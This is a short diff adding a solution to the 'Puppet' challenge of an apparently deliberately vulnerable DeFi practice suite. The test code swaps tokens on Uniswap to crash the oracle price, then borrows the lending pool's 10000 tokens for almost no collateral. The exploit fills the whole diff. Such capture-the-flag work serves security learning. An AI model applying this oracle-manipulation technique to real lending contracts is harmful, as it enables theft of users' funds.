@@ -93,6 +93,13 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+      // sell off half of DVT
+      const deadline = (await web3.eth.getBlock('latest')).timestamp * 2;
+      await this.token.approve(this.uniswapExchange.address, ether('10000'), {from: attacker});
+      await this.uniswapExchange.tokenToEthSwapInput( ether('50'), ether('8'), deadline, {from: attacker});
+      // borrow
+      let price = await this.lendingPool.computeOraclePrice()
+      await this.lendingPool.borrow(ether('10000'), {from: attacker, value: '1'})
     });
 
     after(async function () {
